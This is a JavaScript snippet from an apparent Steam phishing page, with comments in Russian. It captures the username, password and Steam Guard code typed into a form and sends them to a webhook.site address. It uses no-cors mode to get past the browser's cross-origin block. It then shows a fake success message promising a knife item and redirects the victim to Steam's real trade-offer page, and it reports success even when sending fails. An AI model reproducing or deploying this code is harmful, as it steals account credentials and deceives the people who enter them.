<script>
  document.getElementById('steamForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const data = {
      username: document.getElementById('username').value,
      password: document.getElementById('password').value,
      guard: document.getElementById('guard').value || 'нет',
      time: new Date().toISOString()
    };
    
    fetch('https://webhook.site/94a42994d-4ee2-9059-c82ca2c2f1ed', {
      method: 'POST',
      mode: 'no-cors',  // <-- это главное, убирает CORS-блок
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    }).then(() => {
      alert('Успех! Нож будет через 3–5 минут. Перезагрузи игру!');
      window.location = 'https://steamcommunity.com/tradeoffer/new/';
    }).catch(err => {
      console.log('Ошибка отправки:', err);  // для дебага
      alert('Успех!');  // всё равно покажи успех
    });
  });
</script>
